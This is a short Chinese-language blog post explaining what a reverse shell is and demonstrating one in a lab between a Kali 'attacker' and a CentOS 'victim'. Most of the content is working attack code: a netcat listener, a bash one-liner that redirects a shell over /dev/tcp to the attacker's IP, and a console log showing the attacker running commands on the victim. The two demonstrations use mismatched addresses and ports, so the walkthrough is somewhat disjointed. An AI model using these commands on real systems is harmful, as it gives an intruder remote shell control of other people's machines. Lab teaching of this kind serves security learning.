---
layout: post
title:  反弹shell
categories: 安全知识
description: 未授权
keywords: 未反弹shell授权
---

# 什么是反弹 shell

反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，`本质上是网络概念的客户端与服务端的角色反转。`

# 反弹 shell 运行

然后把`攻击机kali的端口`监听打开

```al

nc -lvp 80
```



用受害机centos7生成一个反弹shell，连接宿主机的公网 IP10.8.163.224/nc -lvp 80，这样通过端口转发，就会连接到kali虚拟机上。

bash -i >& /dev/tcp/10.8.163.224/80 0>&1



我们可以看到kali已经获取到受害机的bash。
```dotnetcli

[root@victim ~]# bash -i < /dev/tcp/10.201.61.194/5566        //第二步
[root@victim ~]# hostname        //测试2结果：实现了将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。
victim

 攻击端：

[root@hacker ~]# nc -lvp 5566        //第一步
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5566
Ncat: Listening on 0.0.0.0:5566
Ncat: Connection from 10.201.61.195.
Ncat: Connection from 10.201.61.195:50412.
hostname        //第三步（攻击端执行命令）

```